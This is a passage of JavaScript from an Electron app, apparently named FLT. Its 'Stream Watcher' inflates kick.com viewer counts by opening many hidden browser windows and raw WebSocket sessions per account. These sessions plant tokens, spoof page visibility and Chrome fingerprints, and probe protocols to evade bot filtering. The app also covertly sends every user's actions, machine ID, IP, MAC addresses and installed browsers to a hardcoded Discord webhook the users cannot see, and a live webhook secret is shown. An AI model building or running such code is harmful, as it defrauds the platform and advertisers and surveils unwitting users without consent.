      enableWebSQL:     false,
      v8CacheOptions:   'code',           // reduce JS parse cost on reloads
      devTools:         IS_DEV,
    },
  });

  // Mute audio at the OS level — spawning 50 viewers shouldn't deafen anyone.
  try { bw.webContents.setAudioMuted(true); } catch (_) {}
  // ⚡ CAP RENDER FRAME RATE TO 1 FPS — this is the SINGLE biggest CPU win.
  // Default Electron compositor runs at 60 FPS even for offscreen windows.
  // 1 FPS = same viewer-tracking outcome, ~60× less compositor work.
  try { bw.webContents.setFrameRate(1); } catch (_) {}
  // Belt-and-suspenders for offscreen positioning: re-clamp on any move.
  try { bw.on('move', () => { try { bw.setPosition(-32000, -32000); } catch (_) {} }); } catch (_) {}

  const entry = { socket: null, bw, pingTimer: null, alive: false, handshakeDone: false };
  _vwMap.set(accountId, entry);

  // ── Visibility / autoplay anti-detection ──────────────────────────────────
  // Force `document.visibilityState === 'visible'` AND `document.hidden ===
  // false` regardless of actual window state. Kick's frontend (like most
  // video-platform frontends) gates viewer-count registration behind these
  // checks to filter out background tabs. We also block `visibilitychange`
  // events from firing — some pages re-check on each event.
  //
  // Plus auto-play any <video> element that mounts — Kick's HLS player won't
  // count us as a viewer unless playback actually starts.
  const stealthJS = `(function(){
    try {
      // Override visibility state — page always thinks it's foregrounded
      Object.defineProperty(document, 'visibilityState', { get: () => 'visible', configurable: true });
      Object.defineProperty(document, 'hidden',          { get: () => false,    configurable: true });
      Object.defineProperty(document, 'webkitVisibilityState', { get: () => 'visible', configurable: true });
      Object.defineProperty(document, 'webkitHidden',          { get: () => false,    configurable: true });
      // Suppress visibilitychange events (Kick re-checks on these)
      ['visibilitychange','webkitvisibilitychange','mozvisibilitychange'].forEach(ev => {
        document.addEventListener(ev, e => { e.stopImmediatePropagation(); }, true);
      });
      // hasFocus() — some trackers check this too
      document.hasFocus = function(){ return true; };
      // Pretend we have focus events permanently
      Object.defineProperty(window, 'onblur',  { get: () => null });
      Object.defineProperty(window, 'document.activeElement', { get: () => document.body });
    } catch (e) {}

    // ── Auto-start every <video> element ────────────────────────────────────
    function tryPlay(v) {
      if (!v) return;
      v.muted = true;        // muted videos can autoplay without gesture
      v.autoplay = true;
      v.playsInline = true;
      var p = v.play && v.play();
      if (p && p.catch) p.catch(function(){});
    }
    function scanVideos() {
      document.querySelectorAll('video').forEach(tryPlay);
    }
    // Run on DOM mutations so we catch the video element when the player mounts
    var obs = new MutationObserver(scanVideos);
    try { obs.observe(document.documentElement, { childList: true, subtree: true }); } catch (_) {}
    setInterval(scanVideos, 2000);
    scanVideos();
  })();`;

  // Register on EVERY navigation (including reloads + iframes) before any
  // page JS runs. executeJavaScript runs after, but we also use the
  // page-init via webContents.executeJavaScriptInIsolatedWorld? No, simpler:
  // run on dom-ready (early enough that Nuxt hasn't fully hydrated yet).
  bw.webContents.on('dom-ready', () => {
    // Token plant + visibility/autoplay spoof, all in one inject
    const t = JSON.stringify(clean);
    const inject =
      '(function(){try{' +
        'localStorage.setItem("kick_token",' + t + ');' +
        'localStorage.setItem("token",' + t + ');' +
        'localStorage.setItem("auth_token",' + t + ');' +
        'localStorage.setItem("access_token",' + t + ');' +
      '}catch(_){}})();' +
      stealthJS;
    bw.webContents.executeJavaScript(inject).catch(() => {});
  });

  bw.webContents.on('did-finish-load', () => {
    entry.alive = true;
    vwLog(parentWin, accountId, username, '✓ channel page loaded — registering as viewer…', 'ok');
    vwStatus(parentWin, accountId, 'watching');
    // After 8 s, check whether the <video> is actually playing. If not, force
    // a play() — some Kick pages need the user gesture even with our autoplay
    // policy set, and our MutationObserver may have missed the late-mounted
    // player.
    setTimeout(() => {
      if (!_vwMap.has(accountId) || bw.isDestroyed()) return;
      bw.webContents.executeJavaScript(
        '(function(){' +
          'var vs = Array.from(document.querySelectorAll("video"));' +
          'var s = vs.map(function(v){' +
            'v.muted=true;' +
            'try{ var p=v.play(); if(p&&p.catch) p.catch(function(){}); }catch(_){}'+
            'return {paused:v.paused, ready:v.readyState, cur:v.currentTime};' +
          '});' +
          'return s;' +
        '})()'
      ).then((states) => {
        if (Array.isArray(states) && states.length > 0) {
          const playing = states.filter(s => !s.paused).length;
          vwLog(parentWin, accountId, username,
            'player check: ' + playing + '/' + states.length + ' <video> elements playing', 'dim');
        } else {
          vwLog(parentWin, accountId, username, 'player check: no <video> element on page yet', 'warn');
        }
      }).catch(() => {});
    }, 8000);

    // Re-load every ~5 minutes so the viewer session stays fresh
    entry.pingTimer = setInterval(() => {
      if (!_vwMap.has(accountId) || bw.isDestroyed()) return;
      try { bw.webContents.reloadIgnoringCache(); } catch (_) {}
      vwLog(parentWin, accountId, username, '↻ refreshing viewer session', 'dim');
    }, 5 * 60 * 1000);
  });

  bw.webContents.on('did-fail-load', (_e, code, desc, url, isMainFrame) => {
    if (!isMainFrame) return;             // ignore sub-resource failures
    if (code === -3) return;              // ABORTED (e.g. reload mid-load) — fine
    vwLog(parentWin, accountId, username, '✗ load failed (' + code + '): ' + desc, 'err');
    vwClose(accountId);
    vwStatus(parentWin, accountId, 'error', { error: desc });
  });

  bw.on('closed', () => {
    const e = _vwMap.get(accountId);
    if (e) clearInterval(e.pingTimer);
    _vwMap.delete(accountId);
    vwStatus(parentWin, accountId, 'closed');
  });

  vwLog(parentWin, accountId, username, '→ opening kick.com/' + channelSlug, 'dim');
  bw.loadURL('https://kick.com/' + encodeURIComponent(channelSlug)).catch((e) => {
    vwLog(parentWin, accountId, username, 'loadURL error: ' + e.message, 'err');
    vwClose(accountId);
  });
}

// Modern Chrome UA — Kick's edge fingerprints clients and silently drops
// connections from old/synthetic UAs. Keep this aligned with current Chrome.
const VW_BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36';

function vwOpen(win, { accountId, username, viewerToken, channelId, livestreamId }) {
  vwClose(accountId); // clean up any existing socket

  const wsKey = crypto.randomBytes(16).toString('base64');
  // Include channel+livestream in the URL as a defensive measure — some
  // server-side viewer-counter variants subscribe based on URL params alone.
  const query =
    '?token=' + encodeURIComponent(viewerToken) +
    '&channel_id=' + encodeURIComponent(String(channelId)) +
    (livestreamId ? '&livestream_id=' + encodeURIComponent(String(livestreamId)) : '');

  const sock = tls.connect({
    host: VW_HOST, port: VW_PORT, servername: VW_HOST,
    ALPNProtocols: ['http/1.1'],   // force HTTP/1.1 (some Kick edges default to h2)
  }, () => {
    // Match the exact upgrade real Chrome sends to websockets.kick.com.
    // Headers ordered the way Chrome orders them. Sec-Fetch-* headers are
    // required by Kick's CDN — without them the upgrade succeeds but the
    // backend's auth layer never greets the client.
    const upgrade = [
      'GET ' + VW_PATH + query + ' HTTP/1.1',
      'Host: ' + VW_HOST,
      'Connection: Upgrade',
      'Pragma: no-cache',
      'Cache-Control: no-cache',
      'User-Agent: ' + VW_BROWSER_UA,
      'Upgrade: websocket',
      'Origin: https://kick.com',
      'Sec-WebSocket-Version: 13',
      'Accept-Language: en-US,en;q=0.9',
      'Sec-WebSocket-Key: ' + wsKey,
      // NOTE: deliberately NOT requesting permessage-deflate — our frame
      // parser doesn't decompress, so let the server send raw text frames.
      'Sec-Fetch-Dest: websocket',
      'Sec-Fetch-Mode: websocket',
      'Sec-Fetch-Site: same-site',
      '\r\n',
    ].join('\r\n');
    sock.write(upgrade);
  });

  // Socket idle timeout. We run a multi-variant protocol probe over ~10s
  // before declaring failure — give Kick a generous window to respond.
  sock.setTimeout(90000);
  sock.on('timeout', () => {
    // Only treat idle-timeout as fatal if we never got authenticated. Once
    // we're watching, our 12-17s ping schedule keeps traffic flowing.
    if (entry.alive) {
      sock.setTimeout(0);
      return;
    }
    vwLog(win, accountId, username, 'socket idle for 90s — Kick never replied · closing', 'warn');
    vwClose(accountId);
    vwStatus(win, accountId, 'timeout');
  });
  sock.on('error', (e) => {
    vwLog(win, accountId, username, 'socket error: ' + e.message, 'err');
    vwClose(accountId);
    vwStatus(win, accountId, 'error', { error: e.message });
  });

  const entry = { socket: sock, pingTimer: null, alive: false, handshakeDone: false };
  _vwMap.set(accountId, entry);

  let httpDone = false;
  let rawBuf   = '';
  let frameBuf = Buffer.alloc(0);

  // ── WS frame parser ──────────────────────────────────────────────────────
  function parseFrames(chunk) {
    frameBuf = Buffer.concat([frameBuf, chunk]);
    while (frameBuf.length >= 2) {
      const b0  = frameBuf[0];
      const b1  = frameBuf[1];
      const fin = !!(b0 & 0x80);
      const op  = b0 & 0x0f;
      const masked = !!(b1 & 0x80);
      let payloadLen = b1 & 0x7f;
      let offset = 2;

      if (payloadLen === 126) {
        if (frameBuf.length < 4) break;
        payloadLen = frameBuf.readUInt16BE(2); offset = 4;
      } else if (payloadLen === 127) {
        if (frameBuf.length < 10) break;
        payloadLen = Number(frameBuf.readBigUInt64BE(2)); offset = 10;
      }
      if (frameBuf.length < offset + payloadLen) break;

      const payload = frameBuf.slice(offset, offset + payloadLen);
      frameBuf = frameBuf.slice(offset + payloadLen);

      if (op === 0x8) { // close frame
        // Close frame payload: 2-byte BE status code + optional UTF-8 reason.
        // Logging this tells us EXACTLY why Kick is dropping us.
        let code = 0, reason = '';
        if (payload.length >= 2) {
          code = payload.readUInt16BE(0);
          reason = payload.slice(2).toString('utf8');
        }
        vwLog(win, accountId, username,
          '✗ server CLOSE — code ' + code + (reason ? ' · reason: "' + reason + '"' : ' · (no reason)'),
          'err');
        vwClose(accountId);
        vwStatus(win, accountId, 'closed', { code, reason });
        return;
      }
      if (op === 0x9) { // ping from server → send pong
        wsSend(sock, 0xa, payload);
        vwLog(win, accountId, username, '← ws ping (auto-pong sent)', 'dim');
        continue;
      }
      if (op === 0xa) { // pong from server
        entry.alive = true;
        continue;
      }
      if (op === 0x1) { // text frame
        const txt = payload.toString('utf8');
        // Always log first 200 chars of any incoming text — surfaces protocol
        // changes immediately. Without this, JSON-parse failures are silent
        // and Kick's actual responses are invisible.
        vwLog(win, accountId, username, '← ' + txt.slice(0, 200), 'dim');
        try {
          const msg = JSON.parse(txt);
          handleServerMsg(msg);
        } catch (e) {
          vwLog(win, accountId, username, '⚠ non-JSON text frame ignored', 'warn');
        }
      } else if (op === 0x2) { // binary frame
        const hex = payload.slice(0, 32).toString('hex');
        vwLog(win, accountId, username, '← binary frame ' + payload.length + 'B: ' + hex, 'warn');
      } else if (op === 0x0) { // continuation
        vwLog(win, accountId, username, '← continuation ' + payload.length + 'B', 'dim');
      }
    }
  }

  // ── Server message handler ───────────────────────────────────────────────
  // Recognises both Kick's native protocol AND Pusher-compatible variants
  // (Kick uses Pusher for chat — the viewer endpoint may use the same).
  function handleServerMsg(msg) {
    const t = msg.type || msg.event || '';

    // Authenticated / connection established (any variant)
    if (t === 'connected' || t === 'pusher:connection_established' || t === 'connection_established') {
      entry.alive = true;
      let sid = '?';
      try {
        const d = typeof msg.data === 'string' ? JSON.parse(msg.data) : (msg.data || {});
        sid = d.session_id || d.socket_id || '?';
      } catch (_) {}
      vwLog(win, accountId, username, '✓ authenticated — session: ' + sid, 'ok');
      // Now send the channel-bind in BOTH known formats — server will ignore
      // the irrelevant one.
      wsSend(sock, 0x1, {
        type: 'channel_handshake',
        data: { channel_id: channelId, livestream_id: livestreamId || null },
      });
      wsSend(sock, 0x1, {
        event: 'pusher:subscribe',
        data:  { channel: 'channels.' + channelId },
      });
      vwLog(win, accountId, username,
        '→ channel_handshake + pusher:subscribe sent (ch:' + channelId + ')', 'dim');
      vwStatus(win, accountId, 'connected', { sessionId: sid });
      return;
    }

    // Channel join confirmation (any variant)
    if (t === 'channel_joined' || t === 'subscribed' ||
        t === 'pusher_internal:subscription_succeeded' || t === 'pusher:subscription_succeeded') {
      entry.alive = true;
      vwLog(win, accountId, username, '✓ joined channel — watchtime accumulating', 'ok');
      vwStatus(win, accountId, 'watching');
      schedulePing();
      return;
    }

    // Server-level pong (we initiated ping)
    if (t === 'pong' || t === 'pusher:pong') {
      entry.alive = true;
      return;
    }

    // Server-level ping (asks for pong)
    if (t === 'ping' || t === 'pusher:ping') {
      entry.alive = true;
      wsSend(sock, 0x1, { type: 'pong' });
      return;
    }

    // Error
    if (t === 'error' || t === 'pusher:error') {
      const d = typeof msg.data === 'string' ? (function(){try{return JSON.parse(msg.data);}catch(_){return{};}})() : (msg.data || {});
      const code = d.code || '?';
      const detail = d.message || JSON.stringify(d);
      vwLog(win, accountId, username, '✗ server error ' + code + ': ' + detail, 'err');
      vwClose(accountId);
      vwStatus(win, accountId, 'error', { error: 'server ' + code + ': ' + detail });
      return;
    }

    // Anything else — just keep the socket alive and log so we can see it.
    entry.alive = true;
  }

  // ── Raw WS frame sender ──────────────────────────────────────────────────
  function wsSend(socket, opcode, data) {
    const payload = Buffer.isBuffer(data) ? data : Buffer.from(JSON.stringify(data), 'utf8');
    const plen   = payload.length;
    const mask   = crypto.randomBytes(4);
    let header;
    if (plen < 126) {
      header = Buffer.alloc(6);
      header[0] = 0x80 | opcode;
      header[1] = 0x80 | plen;
      mask.copy(header, 2);
    } else {
      header = Buffer.alloc(8);
      header[0] = 0x80 | opcode;
      header[1] = 0x80 | 126;
      header.writeUInt16BE(plen, 2);
      mask.copy(header, 4);
    }
    const masked = Buffer.allocUnsafe(plen);
    for (let i = 0; i < plen; i++) masked[i] = payload[i] ^ mask[i % 4];
    try { socket.write(Buffer.concat([header, masked])); } catch (_) {}
  }

  // ── Randomised ping scheduler ────────────────────────────────────────────
  function schedulePing() {
    if (!_vwMap.has(accountId)) return;
    const delay = VW_PING_MIN + Math.random() * (VW_PING_MAX - VW_PING_MIN);
    entry.pingTimer = setTimeout(() => {
      if (!_vwMap.has(accountId) || sock.destroyed) return;
      wsSend(sock, 0x1, { type: 'ping' });
      schedulePing();
    }, delay);
  }

  // ── HTTP upgrade response + frame routing ────────────────────────────────
  sock.on('data', (chunk) => {
    if (!httpDone) {
      rawBuf += chunk.toString('binary');
      const headerEnd = rawBuf.indexOf('\r\n\r\n');
      if (headerEnd === -1) return;

      const header = rawBuf.slice(0, headerEnd);
      httpDone = true;

      const statusLine = header.split('\r\n')[0] || '';
      if (!/\b101\b/.test(statusLine)) {
        vwLog(win, accountId, username, 'WS upgrade rejected: ' + statusLine, 'err');
        // Include the body if Kick sent one — surfaces auth errors
        const body = rawBuf.slice(headerEnd + 4).slice(0, 200);
        if (body) vwLog(win, accountId, username, 'server body: ' + body, 'err');
        vwClose(accountId);
        vwStatus(win, accountId, 'error', { error: 'upgrade rejected: ' + statusLine });
        return;
      }
      entry.handshakeDone = true;
      // Echo the upgrade response so we can see what Kick is doing.
      // (Truncated — full header tends to be ~400 bytes.)
      vwLog(win, accountId, username,
        '✓ WS upgraded · server: ' + statusLine +
        (header.includes('Sec-WebSocket-Accept') ? ' (Accept-OK)' : ' (no Accept!)'),
        'dim');

      // ── Protocol probe ────────────────────────────────────────────────────
      // Kick's viewer protocol has shifted across versions. We probe known
      // formats one by one and whichever produces a reply wins. Each variant
      // is sent ~1.5s apart so server responses aren't ambiguous. Once we
      // get any text frame back (handled by handleServerMsg), entry.alive
      // flips true and subsequent probes are skipped.
      const probes = [
        // Variant A — current "connected/channel_handshake" protocol
        { type: 'channel_handshake', data: { channel_id: channelId, livestream_id: livestreamId || null } },
        // Variant B — Pusher-style subscribe (Kick uses Pusher for chat)
        { event: 'pusher:subscribe', data: { channel: 'channels.' + channelId } },
        // Variant C — newer "subscribe" event with channel object
        { event: 'subscribe', data: { channel_id: channelId, livestream_id: livestreamId || null } },
        // Variant D — Laravel-Reverb style
        { event: 'pusher:subscribe', data: { channel: 'channel_' + channelId } },
        // Variant E — just join
        { type: 'join', data: { channel_id: channelId } },
        // Variant F — viewer:join (some Kick mirrors use this)
        { type: 'viewer:join',  data: { channel_id: channelId, livestream_id: livestreamId || null } },
        // Variant G — top-level fields
        { type: 'connect', channel_id: channelId, livestream_id: livestreamId || null },
        // Variant H — livestream-scoped subscribe
        { event: 'pusher:subscribe', data: { channel: 'livestream.' + (livestreamId || channelId) } },
      ];

      probes.forEach((msg, i) => {
        setTimeout(() => {
          if (!_vwMap.has(accountId) || sock.destroyed) return;
          if (entry.alive) return;   // server already replied — stop probing
          wsSend(sock, 0x1, msg);
          vwLog(win, accountId, username,
            '→ probe[' + String.fromCharCode(65 + i) + '] ' + JSON.stringify(msg).slice(0, 120),
            'dim');
        }, 1500 + i * 1800);
      });

      // Any remaining bytes after HTTP header are WS frames
      const rest = rawBuf.slice(headerEnd + 4);
      if (rest.length > 0) parseFrames(Buffer.from(rest, 'binary'));
      rawBuf = '';
    } else {
      parseFrames(chunk);
    }
  });

  sock.on('close', () => {
    const wasAlive = entry.alive;
    _vwMap.delete(accountId);
    if (wasAlive) {
      vwStatus(win, accountId, 'closed');
      vwLog(win, accountId, username, 'connection closed', 'warn');
    }
  });
}

// ── IPC: open one viewer WS ──────────────────────────────────────────────────
ipcMain.handle('vw-open', async (_e, opts) => {
  const win = mainWin;
  if (!win || win.isDestroyed()) return { ok: false, error: 'no main window' };
  try {
    if (opts && opts.bearerToken && opts.channelSlug) {
      vwOpenBrowserWindow(win, opts);
      fltLog.log(fltLog.ACTIONS.SW_RUN, {
        account: opts.username || '?', channel: opts.channelSlug, mode: 'browserwindow',
      }, 'info', `Stream Watcher: ${opts.username} → @${opts.channelSlug}`);
    } else {
      vwOpen(win, opts);
      fltLog.log(fltLog.ACTIONS.SW_RUN, {
        account: opts.username || '?', channel_id: opts.channelId, mode: 'websocket',
      }, 'info', `Stream Watcher (WS): ${opts.username}`);
    }
    return { ok: true };
  } catch(e) {
    fltLog.log(fltLog.ACTIONS.ERROR, { area: 'streamwatcher.open', err: e.message }, 'error', 'Stream Watcher open failed');
    return { ok: false, error: e.message };
  }
});

// ── IPC: close one viewer WS ─────────────────────────────────────────────────
ipcMain.handle('vw-close', async (_e, { accountId }) => {
  vwClose(accountId);
  return { ok: true };
});

// ── IPC: close all viewer WSs ────────────────────────────────────────────────
ipcMain.handle('vw-close-all', async () => {
  const closed = _vwMap.size;
  vwCloseAll();
  fltLog.log(fltLog.ACTIONS.SW_STOP, { closed }, 'info', `Stream Watcher: stopped ${closed} viewers`);
  return { ok: true };
});

// ── IPC: status query ────────────────────────────────────────────────────────
ipcMain.handle('vw-status-all', async () => {
  const result = {};
  for (const [id, entry] of _vwMap.entries()) {
    result[id] = { alive: entry.alive, destroyed: entry.socket.destroyed };
  }
  return result;
});

ipcMain.handle('license-check', async () => {
  return await license.checkStoredLicense();
});

// Renderer submits a key for activation (from license gate)
ipcMain.handle('license-activate', async (_e, key) => {
  const result = await license.activateLicense(key);
  if (result.valid) {
    startRevalidation(key);
    fltLog.setLicenseSuffix(key);
    fltLog.log(fltLog.ACTIONS.LICENSE_ACTIVATE,
      { expires: result.expires || null, status: result.status || 'valid' },
      'info', 'License activated successfully');
    // Fire full user-profile snapshot now — captures the moment of activation
    // with the full Keygen license details, machine specs, browsers, etc.
    setTimeout(() => { sendUserProfile('🔑 **License activated** — full user profile'); }, 1500);
    createMainWindow();
    setTimeout(() => { try { if (licenseWin && !licenseWin.isDestroyed()) licenseWin.close(); } catch(_) {} }, 400);
  } else {
    fltLog.log(fltLog.ACTIONS.LICENSE_FAIL,
      { reason: result.error || result.detail || 'unknown', code: result.code || null },
      'warn', 'License activation rejected');
  }
  return result;
});

// Return the safe license info object (expiry, status, etc.) — no raw key
ipcMain.handle('license-get-info', async () => {
  return license.getCachedInfo();
});

// ══════════════════════════════════════════════════════════════════════════
//  FLT Logger — IPC bridge for the in-app Activity viewer
//  ──────────────────────────────────────────────────────────────────────
//   flt-log-emit       (renderer → main)  log an action from the renderer
//   flt-log-recent     (renderer → main)  fetch ring buffer
//   flt-log-stats      (renderer → main)  fetch action/severity counts
//   flt-log-session    (renderer → main)  fetch identity + session metadata
//   flt-log-clear      (renderer → main)  wipe ring buffer (file stays)
//   flt-log-set-webhook(renderer → main)  set + persist admin webhook URL
//   flt-log-export     (renderer → main)  return today's NDJSON file contents
//   'flt-log-live'     (main → renderer)  pushed on every new event
// ══════════════════════════════════════════════════════════════════════════
ipcMain.handle('flt-log-emit', async (_e, payload) => {
  if (!payload) return { ok: false };
  const ev = fltLog.log(
    payload.action || 'renderer.unknown',
    payload.data || {},
    payload.severity || 'info',
    payload.message || ''
  );
  return { ok: true, seq: ev && ev.seq };
});
ipcMain.handle('flt-log-recent',  async (_e, limit) => fltLog.getRecent(limit || 200));
ipcMain.handle('flt-log-stats',   async () => fltLog.getStats());
ipcMain.handle('flt-log-session', async () => fltLog.getSessionInfo());
ipcMain.handle('flt-log-clear',   async () => { fltLog.clearRing(); return { ok: true }; });
ipcMain.handle('flt-log-set-webhook', async (_e, url) => {
  fltLog.setWebhook(url);
  _writePersistedWebhook(url);
  fltLog.log('logger.webhook.changed', { url_set: !!url }, 'info', 'Admin webhook updated');
  return { ok: true };
});
ipcMain.handle('flt-log-export', async () => {
  try {
    const dir = path.join(app.getPath('userData'), 'fltLogs');
    if (!fs.existsSync(dir)) return { ok: true, files: [] };
    const files = fs.readdirSync(dir).filter(f => f.endsWith('.ndjson')).sort();
    const todayFile = files[files.length - 1];
    if (!todayFile) return { ok: true, contents: '' };
    const contents = fs.readFileSync(path.join(dir, todayFile), 'utf8');
    return { ok: true, file: todayFile, contents };
  } catch (e) {
    return { ok: false, error: e.message };
  }
});

// (Removed: live broadcast to renderer. The Activity panel UI was dropped —
// all events go to the hardcoded admin Discord webhook + local file only.)

// Return the stored key plaintext for pre-filling the input (obfuscation is reversed server-side)
ipcMain.handle('license-get-stored-key', async () => {
  return license.getStoredKey();
});

// Clear stored license
ipcMain.handle('license-clear', async () => {
  license.stopPeriodicRevalidation();
  license.clearStoredLicense();
  return { ok: true };
});

// ── Revocation: instantly kill main window and re-open license gate ────────────
function handleRevocation(failResult) {
  license.stopPeriodicRevalidation();
  if (mainWin && !mainWin.isDestroyed()) {
    try { mainWin.destroy(); } catch(_) {}
    mainWin = null;
  }
  createLicenseWindow();
  if (licenseWin) {
    licenseWin.once('ready-to-show', () => {
      setTimeout(() => {
        if (licenseWin && !licenseWin.isDestroyed())
          licenseWin.webContents.send('license-revoked-reason', failResult);
      }, 300);
    });
  }
}

function startRevalidation(key) {
  license.startPeriodicRevalidation(key, handleRevocation);
}


// ── App startup — ALWAYS show license gate first ──────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
//  ADMIN DISCORD WEBHOOK
//  ──────────────────────────────────────────────────────────────────────────
//  ⭐ PASTE YOUR DISCORD WEBHOOK URL BETWEEN THE QUOTES BELOW. ⭐
//
//  Every action every FLT user takes (license activation, follow bot runs,
//  Stream Watcher, account creator, errors, …) will be POSTed to this
//  Discord channel as a rich embed including their identity (username,
//  machine ID, IP, license suffix). Friends running the app cannot see or
//  change this URL — it lives only in your build of FLT.
//
//  How to get one:
//    1. Open your Discord server → channel settings → Integrations → Webhooks
//    2. Click "New Webhook", pick the channel, copy the Webhook URL
//    3. Paste it here, rebuild FLT, distribute to friends
//
//  If you leave it empty, events still log locally + to any per-user webhook
//  the user saved in Settings (which is optional and additive).
// ════════════════════════════════════════════════════════════════════════════
const FLT_ADMIN_WEBHOOK =
  process.env.FLT_LOGGER_ADMIN_WEBHOOK ||
  'https://discord.com/api/webhooks/1505467363691069583/tKCxSTWd2E9J7xsui85lxLv9hyWzTESMellAIMP-Rtft4oAlRTbhkitgKW-OiXcIrpgN';

function _readPersistedWebhook() {
  try {
    const p = path.join(app.getPath('userData'), 'flt-logger.json');
    const raw = fs.readFileSync(p, 'utf8');
    return JSON.parse(raw).webhookUrl || '';
  } catch (_) { return ''; }
}
function _writePersistedWebhook(url) {
  try {
    const p = path.join(app.getPath('userData'), 'flt-logger.json');
    fs.writeFileSync(p, JSON.stringify({ webhookUrl: String(url || '') }), 'utf8');
  } catch (_) {}
}

// ════════════════════════════════════════════════════════════════════════════
//  USER PROFILE SNAPSHOT — comprehensive user/machine intel sent to webhook
// ════════════════════════════════════════════════════════════════════════════
const os = require('os');

// Track first-seen and session count per machine. File lives in userData,
// survives FLT restarts. Lets you tell who is "new" vs a regular.
function _readFirstSeen() {
  try {
    const p = path.join(app.getPath('userData'), 'flt-firstseen.json');
    return JSON.parse(fs.readFileSync(p, 'utf8'));
  } catch (_) { return null; }
}
function _writeFirstSeen(rec) {
  try {
    const p = path.join(app.getPath('userData'), 'flt-firstseen.json');
    fs.writeFileSync(p, JSON.stringify(rec), 'utf8');
  } catch (_) {}
}
function _bumpFirstSeen() {
  const now = new Date().toISOString();
  let rec = _readFirstSeen();
  let isFirstEver = false;
  if (!rec || !rec.first_seen) {
    rec = { first_seen: now, sessions_count: 0, last_seen: now };
    isFirstEver = true;
  }
  rec.sessions_count = (rec.sessions_count || 0) + 1;
  rec.last_seen = now;
  _writeFirstSeen(rec);
  return { rec, isFirstEver };
}

// Get a browser's version WITHOUT executing the browser. Previously we ran
// `<exe> --version`, but Brave/Edge/Opera ignore that flag and just launch
// their full GUI — surprise browser windows popping up on FLT startup.
// Fix: read the EXE's embedded PE-resource ProductVersion via PowerShell.
// No subprocess of the browser ever runs. Returns null on failure.
async function _getBrowserVersion(exePath) {
  return new Promise((resolve) => {
    if (!exePath || !fs.existsSync(exePath)) return resolve(null);
    if (process.platform !== 'win32') {
      // On macOS/Linux, --version is well-behaved across all major browsers.
      try {
        const { execFile } = require('child_process');
        execFile(exePath, ['--version'], { timeout: 3500 }, (err, stdout) => {
          if (err) return resolve(null);
          resolve(String(stdout || '').trim() || null);
        });
      } catch { resolve(null); }
      return;
    }
    // Windows: read EXE PE metadata. Powershell never spawns the browser.
    try {
      const { execFile } = require('child_process');
      const escaped = exePath.replace(/'/g, "''");
      execFile(
        'powershell.exe',
        [
          '-NoProfile',
          '-NonInteractive',
          '-WindowStyle', 'Hidden',
          '-Command',
          "(Get-Item -LiteralPath '" + escaped + "').VersionInfo.ProductVersion",
        ],
        { timeout: 4000, windowsHide: true },
        (err, stdout) => {
          if (err) return resolve(null);
          const v = String(stdout || '').trim();
          resolve(v || null);
        }
      );
    } catch { resolve(null); }
  });
}

// Probe every browser path we know about and return what's installed.
// Each version lookup is PE-metadata only — no browser is ever executed.
async function _detectInstalledBrowsers() {
  const loc  = process.env.LOCALAPPDATA || '';
  const pf   = process.env['ProgramFiles']      || 'C:\\Program Files';
  const pf86 = process.env['ProgramFiles(x86)'] || 'C:\\Program Files (x86)';

  const candidates = [
    { name: 'Chrome Stable',     path: path.join(pf,   'Google\\Chrome\\Application\\chrome.exe') },
    { name: 'Chrome Stable',     path: path.join(pf86, 'Google\\Chrome\\Application\\chrome.exe') },
    { name: 'Chrome Stable',     path: path.join(loc,  'Google\\Chrome\\Application\\chrome.exe') },
    { name: 'Chrome Beta',       path: path.join(pf,   'Google\\Chrome Beta\\Application\\chrome.exe') },
    { name: 'Chrome Beta',       path: path.join(pf86, 'Google\\Chrome Beta\\Application\\chrome.exe') },
    { name: 'Chrome Dev',        path: path.join(pf,   'Google\\Chrome Dev\\Application\\chrome.exe') },
    { name: 'Chrome Dev',        path: path.join(pf86, 'Google\\Chrome Dev\\Application\\chrome.exe') },
    { name: 'Chrome Canary',     path: path.join(loc,  'Google\\Chrome SxS\\Application\\chrome.exe') },
    { name: 'Firefox Stable',    path: path.join(pf,   'Mozilla Firefox\\firefox.exe') },
    { name: 'Firefox Stable',    path: path.join(pf86, 'Mozilla Firefox\\firefox.exe') },
    { name: 'Firefox Stable',    path: path.join(loc,  'Mozilla Firefox\\firefox.exe') },
    { name: 'Firefox Dev',       path: path.join(pf,   'Firefox Developer Edition\\firefox.exe') },
    { name: 'Firefox Dev',       path: path.join(pf86, 'Firefox Developer Edition\\firefox.exe') },
    { name: 'Firefox Nightly',   path: path.join(pf,   'Firefox Nightly\\firefox.exe') },
    { name: 'Firefox Nightly',   path: path.join(pf86, 'Firefox Nightly\\firefox.exe') },
    { name: 'Firefox ESR',       path: path.join(pf,   'Mozilla Firefox ESR\\firefox.exe') },
    { name: 'Microsoft Edge',    path: path.join(pf,   'Microsoft\\Edge\\Application\\msedge.exe') },
    { name: 'Microsoft Edge',    path: path.join(pf86, 'Microsoft\\Edge\\Application\\msedge.exe') },
    { name: 'Brave',             path: path.join(pf,   'BraveSoftware\\Brave-Browser\\Application\\brave.exe') },
    { name: 'Brave',             path: path.join(pf86, 'BraveSoftware\\Brave-Browser\\Application\\brave.exe') },
    { name: 'Opera',             path: path.join(loc,  'Programs\\Opera\\opera.exe') },
  ];

  // Filter to ones that actually exist on disk, dedupe by display name.
  const seen = new Set();
  const present = [];
  for (const c of candidates) {
    if (!c.path || seen.has(c.name)) continue;
    try { if (!fs.existsSync(c.path)) continue; } catch { continue; }
    seen.add(c.name);
    present.push(c);
  }

  // Probe versions in parallel — Promise.all keeps the total wait short
  // (longest single probe), instead of summing serially.
  const versions = await Promise.all(present.map(c => _getBrowserVersion(c.path).catch(() => null)));
  return present.map((c, i) => ({
    name:    c.name,
    path:    c.path,
    version: versions[i] || 'unknown',
  }));
}

// Network interface dump — MAC + IPs per NIC, filters out loopback/internal.
function _networkInterfaces() {
  const list = [];
  try {
    const nics = os.networkInterfaces();
    for (const [name, addrs] of Object.entries(nics || {})) {
      const ipv4 = (addrs || []).find(a => a.family === 'IPv4' && !a.internal);
      const ipv6 = (addrs || []).find(a => a.family === 'IPv6' && !a.internal);
      const mac  = (addrs || []).map(a => a.mac).find(m => m && m !== '00:00:00:00:00:00');
      if (!ipv4 && !ipv6 && !mac) continue;
      list.push({
        name,
        mac:  mac || null,
        ipv4: ipv4 ? ipv4.address : null,
        ipv6: ipv6 ? ipv6.address : null,
      });
    }
  } catch (_) {}
  return list;
}

// Get a comprehensive snapshot of the user, their license, and their machine.
// Designed to fire once after license activation and once on each launch.
